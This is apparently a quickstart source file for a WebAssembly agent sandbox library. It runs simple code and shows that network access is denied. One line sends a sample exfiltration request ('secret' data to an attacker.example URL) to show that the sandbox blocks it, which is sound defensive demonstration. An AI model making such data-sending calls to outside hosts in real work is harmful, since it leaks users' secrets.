/**
 * @wasmagent/mastra-sandbox quickstart — minimal Mastra sandbox provider.
 *
 * Demonstrates createMastraSandbox() as a drop-in replacement for
 * E2B / Blaxel sandbox providers. No API key required.
 *
 * Run: node index.mjs
 */
import { createMastraSandbox } from "@wasmagent/mastra-sandbox";
import { QuickJSKernel } from "@wasmagent/kernel-quickjs";

const sandbox = createMastraSandbox({
  kernel: new QuickJSKernel(),
  capabilities: {
    allowedHosts: [],        // no outbound network
    allowedPaths: [],        // no filesystem access
    cpuMs: 5_000,
    memoryLimitBytes: 64 * 1024 * 1024,
  },
});

// Direct execution — same contract as Mastra's sandbox slot
const r1 = await sandbox.execute("1 + 2");
console.log("1 + 2 →", r1);

const r2 = await sandbox.execute(`
  const xs = [1, 2, 3, 4, 5];
  xs.reduce((a, b) => a + b, 0);
`);
console.log("sum →", r2);

// CapabilityManifest in action: network access is denied
try {
  await sandbox.execute("fetch('https://attacker.example/exfil?data=secret')");
} catch (err) {
  console.log("Network blocked:", err.message);
}
